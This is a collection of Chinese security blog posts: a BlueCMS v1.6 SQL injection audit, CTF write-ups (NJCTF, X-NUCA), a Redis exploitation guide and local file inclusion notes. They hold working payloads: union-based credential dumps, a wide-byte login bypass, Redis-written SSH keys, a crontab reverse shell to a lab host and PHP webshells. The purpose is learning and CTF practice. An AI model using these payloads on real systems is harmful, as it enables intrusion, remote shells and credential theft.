[{"title":"Bluecms-v1.6-Audit","date":"2017-03-20T08:47:08.000Z","path":"2017/03/20/bluecms-v1-6-audit/","text":"这一次是想学一下代码审计，先从SQL注入开始，所以一章的内容都是关于SQL注入的。这次的例子是bluecms v1.6, 因为这一个cms比较简单，比较适合新手。 so,let’s start. 第一个发现-数值型注入绕过空格用seay的代码审计工具，在第一条我们发现了ad_js.php有一个select语句。123456789101112131415161718192021222324252627$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;if(empty($ad_id))&#123; echo &apos;Error!&apos;; exit();&#125;$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id);if($ad[&apos;time_set&apos;] == 0)&#123; $ad_content = $ad[&apos;content&apos;];&#125;else&#123; if($ad[&apos;end_time&apos;] &lt; time()) &#123; $ad_content = $ad[&apos;exp_content&apos;]; &#125; else &#123; $ad_content = $ad[&apos;content&apos;]; &#125;&#125;$ad_content = str_replace(&apos;&quot;&apos;, &apos;\\&quot;&apos;,$ad_content);$ad_content = str_replace(&quot;\\r&quot;, &quot;\\\\r&quot;,$ad_content);$ad_content = str_replace(&quot;\\n&quot;, &quot;\\\\n&quot;,$ad_content);echo &quot;&lt;!--\\r\\ndocument.write(\\&quot;&quot;.$ad_content.&quot;\\&quot;);\\r\\n--&gt;\\r\\n&quot;; 可以看到，这个$ad_id是直接拼接的，而且未用引号, 那么向上看，它从哪来的。$ad_id = !empty($_GET[&#39;ad_id&#39;]) ? trim($_GET[&#39;ad_id&#39;]) : &#39;&#39;也就是说，如果参数ad_ido不为空，那么就trim一下。将空格去掉。再往上翻，有一个include/common.inc.php查看了一下关键代码，其中12345678910111213141516if(!get_magic_quotes_gpc())&#123; $_POST = deep_addslashes($_POST); $_GET = deep_addslashes($_GET); $_COOKIES = deep_addslashes($_COOKIES); $_REQUEST = deep_addslashes($_REQUEST);&#125;$timezone = &quot;PRC&quot;;if(PHP_VERSION &gt; &apos;5.1&apos;)&#123; date_default_timezone_set($timezone);&#125;$timestamp = time();$online_ip = getip(); deep_addslashes函数是在同目录下的common.fun.php文件夹下123456789101112131415function deep_addslashes($str)&#123; if(is_array($str)) &#123; foreach($str as $key=&gt;$val) &#123; $str[$key] = deep_addslashes($val); &#125; &#125; else &#123; $str = addslashes($str); &#125; return $str;&#125; 但是这和我们现在分析的这一个漏洞没有关系。因为并没有用引号引起来。所以我们可以用/**/注释或者其他的方法如括号，```来绕过空格的限制。试一下。如果不带数值的话 用order by 测试一下列数 可以测出有7列看代码echo &quot;&lt;!--\\r\\ndocument.write(\\&quot;&quot;.$ad_content.&quot;\\&quot;);\\r\\n--&gt;\\r\\n&quot;;输出了$ad[content]的内容。测试一下字段发现在第6个字段然后可以手工跑一下，或者放sqlmap。使用payload11/**/union/**/select/**/0,0,0,0,0,group_concat(table_name,0x7e5e7e),0/**/from/**/information_schema.tables/**/where/**/table_schema=database() 可以将表名都跑出来paydload 11/**/union/**/select/**/0,0,0,0,0,group_concat(column_name,0x7e5e7e),0/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=0x626c75655f61646d696e 可以将数据库中表名为blue_admin所有的列表跑出来。 payload:11/**/union/**/select/**/0,0,0,0,0,group_concat(admin_name,0x7e5e7e,pwd),0/**/from`blue_admin` 可以将admin的帐号密码跑出来 第二个发现-updatexml与多值上传在seay审计工具中，发现第四个疑似注入点在comment.php为:123$sql = &quot;INSERT INTO &quot;.table(&apos;comment&apos;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&apos;&apos;, &apos;$id&apos;, &apos;$user_id&apos;, &apos;$type&apos;, &apos;$mood&apos;, &apos;$content&apos;, &apos;$timestamp&apos;, &apos;&quot;.getip().&quot;&apos;, &apos;$is_check&apos;)&quot;;$db-&gt;query($sql); 其中$id, $user_id等都被intval,htmlspecialchars等做过处理，但是发现了一个getip()是被直接带入的。在/include/common.fun.php中，发现了getip()的函数12345678910111213141516171819202122232425262728function getip()&#123; if (getenv(&apos;HTTP_CLIENT_IP&apos;)) &#123; $ip = getenv(&apos;HTTP_CLIENT_IP&apos;); &#125; elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;)) &#123; $ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;); &#125; elseif (getenv(&apos;HTTP_X_FORWARDED&apos;)) &#123; $ip = getenv(&apos;HTTP_X_FORWARDED&apos;); &#125; elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;)) &#123; $ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;); &#125; elseif (getenv(&apos;HTTP_FORWARDED&apos;)) &#123; $ip = getenv(&apos;HTTP_FORWARDED&apos;); &#125; else &#123; $ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; &#125; return $ip;&#125; 这里由X-Forwared-For,Client-Ip字段得到IP值，然后没过滤就带入INSERT插入。在这里我考虑的是报错。因为可以用updatexml，extractvalue函数来报错。但是往上翻到mysql.class.php，看到query的返回值是返回查询语句并不是错误。所以这一条放弃。1234567function query($sql)&#123; if(!$query=@mysql_query($sql, $this-&gt;linkid))&#123; $this-&gt;dbshow(&quot;Query error:$sql&quot;); &#125;else&#123; return $query; &#125;&#125; 只能考虑重新插入一条数据。payload: 1X-Forwarded-For: 111&apos;,&apos;1&apos;),(&apos;&apos;,&apos;1&apos;,&apos;0&apos;,&apos;1&apos;,&apos;11&apos;, select(select concat(admin_name,0x5e7e5e, pwd) from blue_admin limit 1),&apos;1489845692&apos;,&apos;1 第三个发现-宽字节注入绕过登录在做前两步的时候，发现返回的类型里边是db2312，而不是utf-8，这就有可能是宽字节注入呀。首先我们在前台登录 发现提示不能在管理用户不能在前台登录..这意思是让我们去后台？那我们看一下登录的代码。在admin/login.php文件夹下找到了do_login12345678910111213141516171819202122elseif($act == &apos;do_login&apos;)&#123; $admin_name = isset($_POST[&apos;admin_name&apos;]) ? trim($_POST[&apos;admin_name&apos;]) : &apos;&apos;; $admin_pwd = isset($_POST[&apos;admin_pwd&apos;]) ? trim($_POST[&apos;admin_pwd&apos;]) : &apos;&apos;; $remember = isset($_POST) ? intval($_POST[&apos;rememberme&apos;]) : 0; if($admin_name == &apos;&apos;)&#123; showmsg(&apos;ÓÃ»§Ãû²»ÄÜÎª¿Õ&apos;); &#125; if($admin_pwd == &apos;&apos;)&#123; showmsg(&apos;ÓÃ»§ÃÜÂë²»ÄÜÎª¿Õ&apos;); &#125; if(check_admin($admin_name, $admin_pwd))&#123; update_admin_info($admin_name); if($remember == 1)&#123; setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400); setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400); setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400); &#125; &#125;else&#123; showmsg(&apos;ÄúÊäÈëµÄÓÃ»§ÃûºÍÃÜÂëÓÐÎó&apos;); &#125; showmsg(&apos;»¶Ó­Äú &apos;.$admin_name.&apos; »ØÀ´£¬ÏÖÔÚ½«×ªÏò¹ÜÀíÖÐÐÄ...&apos;, &apos;index.php&apos;);&#125; 接着我们看一下check_admin函数,在 admin/include/common.fun.php文件里边12345678910111213function check_admin($name, $pwd)&#123; global $db; $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;); if($row[&apos;num&apos;] &gt; 0) &#123; return true; &#125; else &#123; return false; &#125;&#125; 经典的注入问题。虽然$name经过了deep_addslashes的处理，但是在宽字节的情况下还是可以绕过的。1admin_name=xxx%df&apos;/**/or/**/1=1%23&amp;password=123 的payload就可以绕过。 感想虽然代码审计很枯燥，但是成就感是相当大的。 其实这个CMS还有很多数字型注入，但是大多数是在update,insert等操作下，因为前边的原因，sql的错误原因不能回显，所以不能利用..， 虽然这个比较简单，但 这是我的入门, 希望以后能多分析一下，向大牛学习。 最后如果有什么错误，请大家指正。 防护最近其实SQL注入已经可以很好的做防护了，但是还是有某些开发人员的水平参差不齐，导致了这类事件的发生。所以防护的话首推预处理, 或者利用一些成熟的框架。或者用在线的防护产品。但是防护产品也可能会被绕过。所以最主要的是有安全的意识，将SQL注入扼杀在摇篮里。","tags":[{"name":"代码审计， web安全","slug":"代码审计，-web安全","permalink":"http://yoursite.com/tags/代码审计，-web安全/"}]},{"title":"Njctf2017-Writeup","date":"2017-03-17T13:04:19.000Z","path":"2017/03/17/njctf2017-writeup-md/","text":"这次比赛暴露了一些知识层面的不足， 也有一些遗憾的事。MISC就不在这里写了。只写WEB get flag通过更改flag的值，如改成flag.txt，可以看到返回的base64编码。这同时也是一个目录遍历漏洞过滤了|, 但是可以通过&amp;&amp;来绕过.最后结果如下: login这个和sqli-labs的一道题很像。一般我们在创建数据库的时候，都喜欢这样1234create table table_name(username varchar(40),password varchar(32),); 如果在得到用户输入的长度超过声明的位数时，就可能导致同一个用户名。这题就是如此，注册一个admin&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;a的用户，然后数据在判断的时候会将其截断，以admin用登录。 text wall这个题明明我已经看到解法了，但是没找到隐藏的源文件…是一个PHP反序列化的解法。 必须满足三个条件 应用程序中必须包含一个实现某个PHP魔幻方法(__wakeup, __destruct)的类 当调用脆弱的unserialize()时，必须声明攻击期间所使用的所有的类,否则必须为这些类支持对象自动加载 传递给反序列化操作的数据必须来自于一个文件，所以服务器上必须包含有一个包含序列化数据的文件。 1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass Example&#123; var $v = &quot;&quot;; function __destruct()&#123; eval($this-&gt;v); &#125;&#125;class foo&#123; public $file = &quot;&quot;; public $data = &quot;&quot;; function __wakeup()&#123; file_put_contents($this-&gt;file, $this-&gt;data); echo &quot;call _wakeup&quot;; &#125;&#125;# 实例化一个类并传入参数$var = &quot;phpinfo()&quot;; $test = new Example();$test-&gt;v = &apos;phpinfo();&apos;; echo serialize($test);# 实例化第二个类并传入参数，再将其序列化。$test2 = new foo(); $test2-&gt;file = &apos;un_test.php&apos;;$test2-&gt;data = &apos;&lt;?php phpinfo();?&gt;&apos;; //echo serialize($test2).&quot;&lt;br/&gt;&quot;;$str = $_GET[&apos;name&apos;];echo $str.&apos;&lt;br/&gt;&apos;; var_dump(unserialize($test));# eval(&quot;phpinfo()&quot;);# 上述这个不会执行，因为&apos;phpinfo()&apos; 这并不一条完整的语句，会报错为# Notice: Undefined index: name in C:\\phpStudy\\WWW\\test.php on line 3# Parse error: syntax error, unexpected $end in C:\\phpStudy\\WWW\\test.php(6) : eval()&apos;d code on line 1# 而 eval(&quot;phpinfo();&quot;);会正确执行# 同时，如果 @eval(&apos;phpinfo()&apos;); 不会报错，因为有 @?&gt; 所以在cookie中看到 list=xxx 之后，分析一下得到前40个字符是后边序列化内容的sha1值。在 .index.php.swo文件中我们可以看到源类为： 12345678910&lt;?php$lists = [];Class filelist&#123; public function __toString() &#123; return highlight_file(&apos;hiehiehie.txt&apos;, true).highlight_file($this-&gt;source, true); &#125;&#125;........?&gt; 那么这是一个文件包含类型的漏洞。首先构造a:1:{i:0;O:8:&quot;filelist&quot;:1:{s:6:&quot;source&quot;;s:9:&quot;index.php&quot;;}} 来读到flag的位置。 再重新构造一个反序列化字符串上传即可。 be admin这个题是一个oracle padding的题。无奈的是我知道这个题但是我解不出来。还没有理解好oracle padding的事，等理解完了再来更新。","tags":[{"name":"ctf, web安全","slug":"ctf-web安全","permalink":"http://yoursite.com/tags/ctf-web安全/"}]},{"title":"Redis利用小结","date":"2017-03-04T12:36:02.000Z","path":"2017/03/04/redis利用小结/","text":"REDIS 远程利用 自己搭建的环境， 两台机器都是CENTOS7， REDIS版本是3.2.4. 其中REDIS-SERVER所在的主机IP是 10.1.1.212 ， 攻击机是在 10.1.1.100。 但是REDIS在新版本中是默认允许远程连接的。 所以这里用 protected-mode no来模拟。 至于实际环境中可以用SSRF来利用。 0x00 REDIS 常用命令redis 命令参考简体中文版 操作String。 12345set key value # 设置键值对GET key # 返回键对应的值.exists key # 判断键是否存在del key # 删除键strlen key # 返回key的长度 操作Hash 1234567hset key field value # 将一个key的字段赋值hset person name &quot;shinpachi8&quot;hmset key field value field2 value2 # 对一个键多个字段同时赋值hgetall key # 返回key中所有字段的值。hexsits key field # 查看key中的field字段是否存在。hlen key # 返回哈希表 key 中的字段总数hdel key field [field] # 删除一个或多个字段 操作列表 12345lpush key value [value2] # 将 一个或多个值lpop key # 移出列表的第一个值并返回lrange key start stop # 返回指定范围内的元素llen key # 列表key 的长度lset key index value # 用下标来设置值 操作集合 是string 的无序集合，集合成员是唯一的。 添加/删除/查找 的时间复杂度都是o(1) 1234sadd key value1 [value2] # 向集合添加一个或多个值sdiff key1 key2 # 返回不同集合之间的差值spop key # 返回key中的一个随机值并删除它sunion key1 key2 # 返回并集 redis 备份与恢复 12save # 保存文件bgsave # 在后台保存文件 如果在恢复，只需要将备份文件(dump.rdb) 保存在redis安装目录并启动服务即可。 0x01 远程登录查看INFO 在这里可以长个心眼，如果版本在这之上的，还可以远程连接，有可能是蜜罐… 0x02 拿SHELL 通过写入 rsa的公钥来远程登录。 其实也可以写入其他用户目录下，但是一般来说REDIS多用ROOT权限登录，直接写入/root/目录下可以省去猜用户的步骤 生成rsa公私钥对。 1ssh-keygen -t rsa 将公钥写入 文件中 1(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; foo.txt 然后利用 redis-cli 的 管道技术将值设置进去, 然后再进入redis, 更改其配置文件与数据库名，保存。 12345$cat foo.txt | redis-cli -h 10.1.1.212 -x set crackredis$redis-cli -h 10.1.1.212 # 连接，以下操作在redis-cli 命令行中进行$10.1.1.212:6379&gt; CONFIG SET dir /root/.ssh/$10.1.1.212:6379&gt; CONFIG set dbfilename &quot;authorized_keys&quot;$10.1.1.212:6379&gt; save 然后用私钥连接目标即可。 1ssh -i id_rsa root@10.1.1.212 通过写入 crontab (计划性任务) 来反弹 shell 在测试时用 flush all 将数据删除，在实际中可以不用。或者先保存，再删除，之后再恢复。 删除所有数据 12$10.1.1.212:6379&gt; FLUSHALL$10.1.1.212:6379&gt;exit 用管道来将计划任务写入redis中, 或者之前不退出，直接写入。 其中 set 1 的意思是将内容的健设置为1，这样保证保存的时候在最前边。 12345echo &quot;\\n\\n */1 * * * * bash -i &gt;&amp; /dev/tcp/10.1.1.100/2333 0&gt;&amp;1 \\n\\n&quot; | redis-cli -h 10.1.1.212 -x set 1redis-cli -h 10.1.1.212$10.1.1.212:6379&gt; CONFIG set dir /var/spool/cron$10.1.1.212:6379&gt; CONFIG set dbfilename root$10.1.1.212:6379&gt; save 然后再本机监控 2333端口 1nc -l -p 2333 写一个WEBSHELL。 同样，在测试环境中，首先将所有的数据 flushall掉。 直接登录 12345redis-cli -h 10.1.1.21210.1.1.212:6379&gt; CONFIG SET dir /var/www/html/10.1.1.212:6379&gt; CONFIG SET dbfilename &quot;test.php&quot;10.1.1.212:6379&gt; set a &quot;&lt;?php system($_GET[&apos;cmd&apos;])?&gt;&quot;10.1.1.212:6379&gt; save 浏览器访问 写一个webshell 这里不将数据 flushall， 这时候需要考虑的是在写入的键包含?&gt; 或者 &lt;? 可以破坏PHP结构的语句。 同时以防数据量过大超时。 可以将文件写成一个写入文件的shell。 直接写入文件 1234567891011redis-cli -h 10.1.1.212# 写入内容为:&lt;?php set_time_limit(0); $fp=fopen(&quot;webshell.php&quot;,&quot;w&quot;); fwrite($fp,&quot;&lt;?php system($_GET[&apos;cmd&apos;])?&gt;&quot;); exit();?&gt;// 或者用file_put_contents() 但是这个我在的实验环境中没有成功。 0x03 参考连接 redis写shell的小技巧 Redis 未授权访问配合 SSH key 文件利用分析 利用redis写webshell","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"本地文件包含简单练习","date":"2017-02-22T08:42:38.000Z","path":"2017/02/22/lfi/","text":"测试本地文件包含 分别在windows使用的phpStudy, 在kali上使用的是apache， 漏洞环境使用的是dvwa。 直接读取 这个是最简单的，不说什么。直接上图 截断 另外一些可以利用的场景即是利用空字符 ,多个.或者./字符绕过。 如果源代码如下: 12$file = $_GET[&apos;page&apos;];include($file.&apos;php&apos;); 可以用空字符来截断%00如下图：但是空字符是有限制的。即版本不能高于5.3.4。 这时为了测试，将版本改了5.2.7 可以利用 多个.来进行截断。这里只测试了WINDOWS。 LINUX的需要的更长一些。如下图: 也可以利用./来进行截断，同样是在windows下测试。 据说也可以利用/.来进行截断，但是在测试里并没有实现。 php://filter php://filter类似于一种在打开流时的过滤元包装器。即可以读也可以写。其应用为: php://filter/read/resource= php://filter/write/resource=, 或者直接php://filter/resource= 也可以加上过滤器php过滤器 这个也常用于CTF的比赛中。 php://filter/convert.base64-encode/resource=的使用下图:php://filter/read使用如下: zip:// | phar:// 是两个处理压缩包的伪协议。其中 zip:// 将压缩后的文件打开时用#, phar://用 / 使用这种文件读取方法，首先要先上传一个zip的压缩包。这里我们直接将内容为&lt;?php echo &quot;your wrapper successed&quot;?&gt;的文件压缩完放至 /dvwa/hackable/uploads/路径下， 因为我试着直接上传之后再不能打开，原因还未找到。 同样，这两个伪协议在CTF中也很常用。 HCTF中有一个题也是用的这个小把戏。 可以参看博客里最后一题..(做的比较LOW，求不喷..)hctf writeup 利用方法如下: php://input php://input is a read-only stream that allows you to read raw data from the request body。 php://input是一个允许在请求体中读取数据的只读流。 利用方式如下: 本地可包含 /proc/self/environ,log 可参考这篇文章exploit-db shell via LFI - proc/self/environ method, 同时关于log日志的包含大家应该比较熟悉了。这里就放一块来说了。 后边的测试包括SMTP都是在METASPLOITABLE上测试的, 本来想到做环境，后来想到既然有现成的，为什么不用呢？？测试步骤: 首先要测试是否有LFI漏洞。 测试是否可包含environ, 或者日志文件, 可猜测的路径有/proc/self/environ, /var/log/apache2/access.log, /var/log/apache2/error.log等， 也可以用这一个burpsuite插件来做. 尝试在这几个文件中注入php代码。 因为我们知道，include函数可以将含php代码的非PHP的文件解析为php文件。如下: 可以在HTTP的USER-AGENT头注入代码，也可以用CURL来注入。 同样可以利用日志文件来进行包含。 当然如果文件太大，可能解析会比较慢。这里我将日志文件的权限设置为了777，否则没有权限读。 通过SMTP来利用 如果目标直接或者通过网络来发送邮件，并在系统上存储www-data 或者apache的邮件，那么可以尝试将php代码通过邮件发送给目标。 如果没有MX记录，但是SMTP对外开放，那么可以用TELNET并向SMTP发送包含PHP代码的邮件来进行利用。 还要就是要有/var/spool/mail/的读取权限。 首先扫描一下SMTP用户: 利用如下图: 首先先如右边所示，利用TELNET将邮件发给WWW-DATA，然后再文件包含/var/spool/mail/www-data 利用上传时候的临时文件获得反向SHELL php在上传时会产生一个临时文件，而这个临时文件会在HTTP会话结束之后删掉。可以用move_upload_file函数来将临时文件移动到另外的位置。如果在这个会话结束之前，将临时文件包含就可以执行反向的shell等命令。 详细如见:PHP_LFI_rfc1867_temporary_files 这个没有将代码写完，先做一个记录。 可见案例链家旗下自如某站一个有意思的文件包含到简单内网渗透（本地文件包含getshell技巧） linksphp wrappers 设置环境 这里有一部分是在WINDOWS下使用的，另外一部分是在linux下。在windows下的是用的phpStudy， 可以自行设置，linux是使用的kali git clone form github12cd /var/www/html/git clone https://github.com/s4n7h0/xvwa.git change php7 to php5123456apt-get install php5 php-pear php-mysql//this fit for apache//from php7 to php5a2dismod php7.0a2enmod php5.6service apache2 restart change config.php12345$XVWA_WEBROOT = &apos;&apos;;$host = &quot;localhost&quot;;$dbname = &apos;xvwa&apos;;$user = &apos;root&apos;;$pass = &apos;&apos;;","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"Xnuca","date":"2017-01-19T03:02:37.000Z","path":"2017/01/19/xnuca/","text":"write-up 说来很尴尬，这个CTF自己并没有做出来多少。只不过是写出来自己总结一下经验 放一个详细的write-up合天官方write-up Q1 BaseCoding 这个题自己解出来了，很简单的一个编码题 题目：BaseCoding write-up:访问页面，得到了base64编码的flag信息，base64解码即可 Q2 BaseInjection 这个也比较容易，是一个SQL注入的问题，两个框都用&#39; or &#39;1&#39;=&#39;1 来试一下 题目：BaseInjection write-up：对两个输入框分别尝试万能的&#39; or &#39;1&#39;=&#39;1 ，在尝试密码框的时候成功了。 Q3 BaseReconstruction info: 看似和上题一样，其实不然 题目：BaseReconstruction write-up：本地JS做了过滤，所以抓包(fiddler, burpsuite)来修改请求为&#39; or &#39;1&#39;=&#39;1 Q4 CountingStars 这个题对我来说好坑，只怪自己不够猥琐，没有多方面考虑info: no more $s, counting stars 题目：CountingStars write-up：先吐槽一句，这个脑洞太大，也怪自己不够猥琐，还得学习呀。 其实并不是解密题。 .DS_Store文件信息泄露，下载分析得到一个压缩包 解压为index.php的源码 重定向到index.php之前查看抓到的包，可以看到flag Q5 Invisible 这个也解出来了，简单的修改头部变量 题目：Invisible write-up： 查看源代码，发现index.php.bak base64解码 考查点为HTTP请求头中关于IP的问题 直接添加头部，或者用其他的方法隐藏IP Q6 Normal_normal info: 又是一个bbs，然而并没有做出来 题目：Normal_normal write-up： 根据网站的风格以及CSS文件的注释，CMS是phpwind，而不是phpbbb(真心不知道..) 发现zhangrendao的邮箱信息，公开的社工库查询到邮箱密码 进入admin.php管理后台 在自定义HTML中可以插入php代码 调用模块，即可获得flag Q7 NDBexplorer 提到就想跪，就是这个，刚刚看到db.php.swp的文件，接着服务器就被日穿了…. 题目：NDBexplorer write-up： 站点.db.php.swp泄露了mysql配置信息，但是ctfdb用户的权限不足，无法用select&#39;&lt;?php@eval($_POST[-77]);?&gt;&#39;INTO OUTFILE &#39;/var/www/html/errors.php&#39; 而flag存在另外一个flag数据库，.db.php.swp可看到phpMyAdmin； 正确思路是使用ctfdb用户通过phpMyAdmin连接数据库，查看数据库数据存放路径：SELECT @@datadir； 创建一张表，然后使用load data infile，加载mysql下的用户口令文件user.MYD到这张表中，命令如下：loaddata infile &quot;/var/lib/mysql/mysql/user.MYD&quot; into TABLE test.q fields terminated by &#39;&#39; LINES TERMINATED BY &#39;\\0&#39;; 然后查看导进去的内容，得到root、ctfdb、topsec、top用户的密码哈希值sha1； 其中root不大可能跑出来，但topsec这个用户的密码可以跑出来topsec123456； 最后用跑出来的用户名密码连接数据库，最后翻出flag。 Q8 RotatePicture 这个题看过了，但是没有解出来… ORZ 题目：RotatePicture write-up： 根据网站的功能，推断后端脚本使用了urlopen等类似函数进行了网络请求。 urlopen支持file schema，因此可以输入file://localhost/filename形式的参数进行本地文件读取，尝试输入file://localhost/etc/hosts,可显示该文件部分信息。 根据html注释的提示，输入file://localhost/home/www/ctf/app/views.py，获得下一步提示，网站存在另外一个页面/getredisvalue 新页面需要输入key并从redis中读出对应的value，如果存在则返回flag。 结合redis和第一个页面的urlopen，想到使用urlopen的缺陷进行header攻击。返回前一个页面，输入http://127.0.0.1%0d%0aSET%20d4c5428c-f43c-4bae-9269-493e9cc593d6%20bar%0d%0aSAVE%0d%0a:6379/foo，此时会在redis中写入相应键值。回到第二个页面，输入key：d4c5428c-f43c-4bae-9269-493e9cc593d6可以获得flag Q9 AdminLogin 这个看到了…当时毫无思路 题目：AdminLogin write-up： 直接打开news.php显示”where r u come from?”，从index.php的链接跳转到news.php可显示rules； news.php可进行sql注入，但是需要在header中添加Referer=http://xxx/index.php （包含index.php即可）； 注入获取用户名ctfadmin及密码a2224f1bf263d26bab1994723f7565a3，爆破md5，最终结果为administrat0r； 接下来找登录地址，正确思路是根目录有robots.txt（防止蜘蛛文件），可发现后台路径/xnucactfwebadmin/； 然后有.svn文件泄露，可在xnucactfwebadmin根目录找着.svn/entries，从而发现与后台登录地址/welcometoctfloginxxx.php； 要求X-Forwarded-For设置为8.8.8.8才能登录成功； 登录校验页面logincheck.php登录成功后输出echo &quot;&lt;script&gt;alert(&#39;Successful login,Congratulations..&#39;);window.location.href=&#39;index.php&#39;;&lt;/script&gt;&quot;; flag以&lt;!-- &lt;imgsrc=&quot;data:image/png;base64,iVBORw0KGgo=...&quot; /&gt; --&gt;形式写在logincheck.php； 想办法阻止window.location.href=’index.php’，最简单办法是调整IE安全级别； 在welcometoctfloginxxx.php页面找到一个img，图片为base64编码，还原图片获得flag{xxxxxx}。 Q10 WeirdCamel 同样的一脸懵逼…info: 欢迎报名夏令营，请您仔细阅读公告，之后我们将会审核您的报名信息。 题目：WeirdCamel write-up： 初始页面为活动报名页面，需要填写“姓名”,“电话”，“邮箱”进行报名 页面会将信息以POST方式发送到/cgi-bin/register.pl，参数为：name=alice&amp;phone=123456&amp;email=123@123.com页面注释提示文件/file/statement.txt,访问后得到公告的文本信息 后台处理流程为：Perl CGI接受参数组成hash: 123456%info=&#123;“STATEMENT” =&gt;”../file/statement.txt”, &quot;NAME&quot;=&gt; $input-&gt;param(&apos;name&apos;), &quot;PHONE&quot; =&gt;$input-&gt;param(&apos;phone&apos;), &quot;EMAIL&quot; =&gt; $input-&gt;param(&apos;email&apos;), &#125;; 之后将信息返回到页面中 返回信息中含有“STATEMENT”,与第二步中文件内容一致，猜到可能会有文件包含在页面中以类似HASH的形式给出，提示答题者内容存放在HASH变量中 利用Perl变量特性改造参数为：name=alice&amp;name=STATEMENT&amp;name=../cgi-bin/register.pl此时name参数被定义为数组，HASH中值为数组时会改变结构，如： 123456%info=&#123;“STATEMENT” =&gt;”../file/statement.txt”, &quot;NAME&quot; =&gt; （&quot;alice&quot;,&quot;STATEMENT&quot;,，&quot;../cgi-bin/register.pl&quot;）, &quot;PHONE&quot; =&gt;$input-&gt;param(&apos;phone&apos;), &quot;EMAIL&quot; =&gt; $input-&gt;param(&apos;email&apos;), &#125;; 实际上为： 1234567%info=&#123;“STATEMENT” =&gt;”../file/statement.txt”, &quot;NAME&quot; =&gt; &quot;alice&quot;, &quot;STATEMENT&quot; =&gt;&quot;../cgi-bin/register.pl&quot;, &quot;PHONE&quot; =&gt;$input-&gt;param(&apos;phone&apos;), &quot;EMAIL&quot; =&gt; $input-&gt;param(&apos;email&apos;), &#125;; “STATEMENT”被覆盖，从而能够读取register.pl的源码 源码中注释看到另一个页面xnuca_looktheregisternews.pl?id=1,访问后显示一条新闻，想到注入 PerlCGI会对单引号自动转义为\\’，因此需要寻找突破口 当参数为id=1&amp;id=2时，转义就会失效，可以进行手工注入 猜测当前表为news，注入查看列个数/cgi-bin/xnuca_looktheregisternews.pl?id=1and 1=2 union select 1,2,3（试到3时出现结果，因此有三列） from news&amp;id=2 注入查看数据库，发现存在xnuca_flag_db数据库/cgi-bin/xnuca_looktheregisternews.pl?id=1and 1=2 union select 1,2,SCHEMA_NAME from information_schema.SCHEMATA&amp;id=2 注入查看表，发现存在xnuca_flag_tab表/cgi-bin/xnuca_looktheregisternews.pl?id=1%20and%201=2%20union%20select%201,table_name,table_schema%20from%20information_schema.tables&amp;id=2 注入查看列，发现只有一列flag/cgi-bin/xnuca_looktheregisternews.pl?id=1%20and%201=2%20union%20select%201,COLUMN_NAME,TABLE_NAME%20from%20information_schema.COLUMNS&amp;id=2 注入得到flag{xxxxxx}id=1 and 1=2 union select 1,2,flag from xnuca_flag_db.xnuca_flag_tab&amp;id=2 Q11 OneWayIn 这个没见过，后边的也没有见 题目：OneWayIn write-up： index.php登录页面泄露部分源码； 想办法绕过crc32($_POST[&#39;0_username&#39;]) ===crc32($_POST[&#39;0_pwd&#39;])； php的crc32函数在处理数组时直接返回null，可提交：0_username[]=111&amp;0_pwd[]=222&amp;submit=Submit； 登录后地址后被重定向，得到一堆字符，字符无用； 重定向之后的url为http://IP/flag_manager/index.php?file=dGVzdC50eHQ=&amp;num= file=dGVzdC50eHQ=解码后得到file=test.txt,猜测存在文件包含漏洞； 更改参数file的值为index.php的base64编码，得到空白页面； 更改num参数为1后得到一行代码，同理，得到index.php的全部18行代码； 发现页面读取flag,php，但需要cookie为role_cookie=flagadmin； 将5中的参数file值修改为flag.php的base64编码，并在请求中添加cookie，根据8得到flag.php的源码； flag.php源码被加密，本地搭建环境执行得到提示ADwAcwBjAHIAaQBwAHQAPgBmAGwAYQBnAHsATAB6AFUAVgB6AEQATwBvAHgAeQBlAG4AYwA4AHAAagBUADkAdwBlAG8AUgB1AE4ATgBJAE8ATQA0AGIAUQAyAH0APAAvAHMAYwByAGkAcAB0AD4 通过ADwAcw识别为utf-7编码，界面得到flag为：&lt;script&gt;flag{LzUVzDOoxyenc8pjT9weoRuNNIOM4bQ2}&lt;/script&gt; Q12 HelloBoss 没见过 题目：HelloBoss write-up： 访问题目地址得到系统登录页面，发现用户名和MD5运算后的密码被POST到login.php 直接访问login.php提示登录失败，尝试文件名后加“~”发现源码泄露login.php~。但login.php~并非源码，仅给答题者提示：用户名为editor，密码MD5开头为0e 此时将POST请求进行改包，将密码改为数字0，即可绕过后端验证。原理是PHP认为0==”以0e开头后边全为数字”（科学计数法） 登录成功后页面从manage.php重定向到upload.php，可以上传文件，但只允许上传doc文件。上传成功后会提示管理员会定期查看，想到利用文件名xss。此时cookie为role= 6704940cdd9b9d906229c2510400fb77，想到获取管理员的cookie 构造xss文件名，但windows下对文件名限制较严格，且windows和linux下文件名中都无法使用“/”，对xss的payload构造增加了难度。一个可执行的测试payload为（答题者需在linux下，并使用firefox）:&lt;img src=x onerror=alert(&#39;123&#39;)&gt;.doc一个可执行的最终Payload为（答题者需在linux下，并使用firefox）:&lt;img src=x onerror=&quot;javascript:var 